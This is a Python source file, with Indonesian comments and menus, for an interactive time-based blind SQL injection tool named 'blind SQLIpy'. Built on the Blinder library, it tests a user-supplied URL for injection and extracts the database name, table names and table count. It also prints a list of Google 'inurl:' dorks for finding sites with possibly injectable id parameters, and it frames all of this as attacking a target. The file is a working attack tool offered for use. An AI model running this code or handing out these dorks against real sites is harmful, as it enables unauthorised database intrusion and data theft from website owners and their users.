#library
import Blinder
import time
import requests
from cfonts import *
from termcolor import colored
from pyfiglet import *

#tes sasaran : http://testphp.vulnweb.com/product.php?pic=1

#pembukaan alat blind SQLIpy
f = Figlet(font='standard')
print(colored(f.renderText('blind SQLIpy')))
print(
"""
 [>] Di Koding Oleh : Galih Anggoro Prasetya
 [>] Github         : https://github.com/galihap76
"""
)
print('\n')
#blind SQLIpy
print("""
===================================
[+]         blind SQLIpy        [+]
===================================
 [1] CEK INJEKSI URL SASARAN
 [2] DAPATKAN NAMA DATABASE SASARAN
 [3] DAPATKAN NAMA TABEL SASARAN
 [4] DAPATKAN JUMLAH TABEL SASARAN
 [5] DORK INJEKSI SQL
 [6] INFO DAN CONTOH PENYERANGAN
 [7] KELUAR                   
                              
===================================

""")

while True:
 print("\n")
 #tanya user
 tanyaUser = input("[+] pilih nomor yang kamu mau : ")

#jika user pilih nomor 1
 if tanyaUser == "1":
     try:
         #cek injeksi url sasaran
         blind_SQLIpy = input("[+] masukkan URL sasaran pada blind SQLIpy : ")
         #beri peringatan untuk menunggu hasil
         print("[!] harap tunggu...")
         #berikan hasil
         blind = Blinder.blinder(blind_SQLIpy,sleep=1)
         print ("[+] bernilai : ",blind.check_injection())
         #berikan peringatan ketika koneksi terputus
     except requests.exceptions.ConnectionError:
         print('[-] ups koneksi terputus!')
        #berikan peringatan ketika salah memasukkan URL sasaran
     except:
         print('[-] URL yang kamu masukkan salah!')
         
#jika user pilih nomor 2
 elif tanyaUser == "2":
     try:
         #dapatkan nama database sasaran
         blind_SQLIpy = input("[+] masukkan URL sasaran pada blind SQLIpy : ")
         #beri peringatan untuk menunggu hasil
         print("[!] harap tunggu...")
         #berikan hasil
         blind = Blinder.blinder(blind_SQLIpy,sleep=1)
         print ("[+] nama database pada sasaran : ",blind.get_database())
     #berikan peringatan ketika koneksi terputus
     except requests.exceptions.ConnectionError:
         print('[-] ups koneksi terputus!')
     #berikan peringatan ketika salah memasukkan URL sasaran
     except:
         print('[-] URL yang kamu masukkan salah!')
        
       
#jika user pilih nomor 3
 elif tanyaUser == "3":
     try:
         #dapatkan nama tabel sasaran
         blind_SQLIpy = input("[+] masukkan URL sasaran pada blind SQLIpy : ")
         #beri peringatan untuk menunggu hasil
         print("[!] harap tunggu...")
         #berikan hasil
         blind = Blinder.blinder(blind_SQLIpy,sleep=1)
         tabel = blind.get_tables()
         for tabelSasaran in tabel:
              print("[+] nama tabel pada sasaran : ",tabelSasaran)
     #berikan peringatan ketika koneksi terputus
     except requests.exceptions.ConnectionError:
         print('[-] ups koneksi terputus!')
     #berikan peringatan ketika salah memasukkan URL sasaran
     except:
         print('[-] URL yang kamu masukkan salah!')
         
#jika user pilih nomor 4
 elif tanyaUser == "4":
     try:
         #dapatkan jumlah tabel sasaran
         blind_SQLIpy = input("[+] masukkan URL sasaran pada blind SQLIpy : ")
         #beri peringatan untuk menunggu hasil
         print("[!] harap tunggu...")
         #berikan hasil
         blind = Blinder.blinder(blind_SQLIpy,sleep=1)
         Nomortabel = blind.get_tables_number()
         print("[+] jumlah tabel pada sasaran : ",Nomortabel)
     #berikan peringatan ketika koneksi terputus
     except requests.exceptions.ConnectionError:
         print('[-] ups koneksi terputus!')
     #berikan peringatan ketika salah memasukkan URL sasaran
     except:
         print('[-] URL yang kamu masukkan salah!')

#jika user pilih nomor 5
 elif tanyaUser == "5":
     #berikan dork injeksi SQL
     print("[+] DORK INJEKSI SQL [+]")
     print("-----------------------------")
     time.sleep(1)
     print("[+] inurl:product.php?id=")
     time.sleep(1)
     print("[+] inurl:sql.php?id=")
     time.sleep(1)
     print("[+] inurl:article.php?id=")
     time.sleep(1)
     print("[+] inurl:aboutbook.php?id=")
     time.sleep(1)
     print("[+] inurl:index.php?id=")
     time.sleep(1)
     print("[+] inurl:gallery.php?id=")
     time.sleep(1)
     print("[+] inurl:review.php?id=")
     time.sleep(1)
     print("[+] inurl:material.php?id=")
     time.sleep(1)
     print("[+] inurl:read.php?id=")
     time.sleep(1)
     print("[+] inurl:curriculum.php?id=")
     time.sleep(1)
     print("[+] inurl:title.php?id=")
     time.sleep(1)
     print("[+] inurl:view.php?id=")
     time.sleep(1)
     print("[+] inurl:news_view.php?id=")
     time.sleep(1)
     print("[+] inurl:select_biblio.php?id=")
     time.sleep(1)
     print("[+] inurl:read.php?id=")
     time.sleep(1)
     print("[+] inurl:section.php?id=")
     time.sleep(1)
     print("[+] inurl:theme.php?id=")
     time.sleep(1)
     print("[+] inurl:material.php?id=")
     time.sleep(1)
     print("[+] inurl:viewapp.php?id=")
     time.sleep(1)
     print("[+] inurl:ages.php?id=")
     time.sleep(1)
     print("[+] inurl:labels.php?id=")
     time.sleep(1)
     print("[+] inurl:newscat.php?id=")
     time.sleep(1)
     print("[+] inurl:story.php?id=")
     time.sleep(1)
     print("[+] inurl:viewphoto.php?id=")
     time.sleep(1)
     print("[+] inurl:news-full.php?id=")
     time.sleep(1)
     print("[+] inurl:tradeCategory.php?id=")
     time.sleep(1)
     print("[+] inurl:category.php?id=")
     time.sleep(1)
     print("[+] inurl:hosting_info.php?id=")
     time.sleep(1)
     print("[+] inurl:main.php?id=")
     time.sleep(1)
     print("[+] inurl:download.php?id=")
     time.sleep(1)
     print("[+] inurl:readnews.php?id=")
     time.sleep(1)
     print("[+] inurl:faq2.php?id=")
     time.sleep(1)
     print("[+] inurl:announce.php?id=")
     time.sleep(1)
     print("[+] inurl:showimg.php?id=")
     time.sleep(1)
     print("[+] inurl:shop_category.php?id=")
     time.sleep(1)
     print("[+] inurl:clanek.php4?id=")
     time.sleep(1)
     print("[+] inurl:chappies.php?id=")
     time.sleep(1)
     print("[+] inurl:view_product.php?id=")
    
#jika user pilih nomor 6
 elif tanyaUser == "6":
         #berikan info dan contoh penyerangan
         print("""
[!] Info penyerangan

[>] Penyerangan pada alat blind SQLIpy menggunakan dasar waktu sql pastikan koneksi internet menyala dan kuat jika tidak penyerangan pada sasaran akan gagal.
[>] Penyerangan dasar waktu sql ini membutuhkan waktu yang lama agar bisa mendapatkan database atau tabel sasaran harap kamu harus menunggu dan bersabar.
[>] Ketika kamu ingin menyerang sasaran dan memilih nomor 1,2,3,4 kamu cukup masukkan URL pada sasaran yang kamu inginkan.                                

[!] Contoh Penyerangan

[+] pilih nomor yang kamu mau : 1
[+] masukkan URL sasaran pada blind SQLIpy : http://testphp.vulnweb.com/product.php?pic=1
""")

#jika user pilih nomor 7
 elif tanyaUser == "7":
     #keluar dari blind SQLIpy
     break
     exit

#cek jika user bukan memilih nomor 1, 2, 3, 4, 5, 6, 7
 elif tanyaUser != "1" or tanyaUser != "2" or tanyaUser != "3" or tanyaUser != "4" or tanyaUser != "5" or tanyaUser != "6" or tanyaUser != "7":
     #Kasih peringatan
     print("[-] maaf nomor yang kamu masukkan salah!")
